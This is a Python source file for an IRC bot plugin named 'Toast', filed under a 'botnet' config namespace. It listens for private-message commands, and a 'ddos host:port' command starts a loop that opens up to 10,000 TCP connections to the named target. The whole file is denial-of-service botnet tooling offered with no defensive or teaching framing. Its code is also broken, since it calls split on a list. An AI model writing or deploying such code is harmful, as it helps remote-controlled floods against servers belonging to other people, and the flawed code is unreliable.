import os
import socket

import threading

from .. import BaseResponder


class Toast(BaseResponder):
	config_namespace = 'botnet'
	config_name = 'toast'

	def get_all_commands(self):
		rw = super(Toast, self).get_all_commands()
		try:
			for command in self.config['module_config'][self.config_namespace][self.config_name].keys():
				rw.append(command)
		except Exception as e:
			print(e)
		return rw

	def handle_privmsg(self, msg):
		if self.is_command(msg):
			command = (str(msg).split('!')[-1])
			print('>>> COMMAND RECEIVED: %s' % command)
			cmd, *params = command.split()

			if cmd == 'ddos' and params:
				self.respond(msg, command + ' ok')
				host, port = params.split(':')
				self.dudos(sock=msg, host=host, port=int(port))
			elif cmd == 'quit':
				self.respond(msg, command + ' ok')
				self.respond(msg, 'Bye!')
				exit()
			else:
				self.respond(msg, 'no such command')

	def dudos(self, host='127.0.0.1', port=8080, times=10000, sock=None):
		self.respond(sock, 'Dudos in progress...')
		for _ in range(times):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				sock.connect((host, port))
				sock.send(b'hello')
				sock.close()
			except Exception as e:
				print(e)
				break



mod = Toast
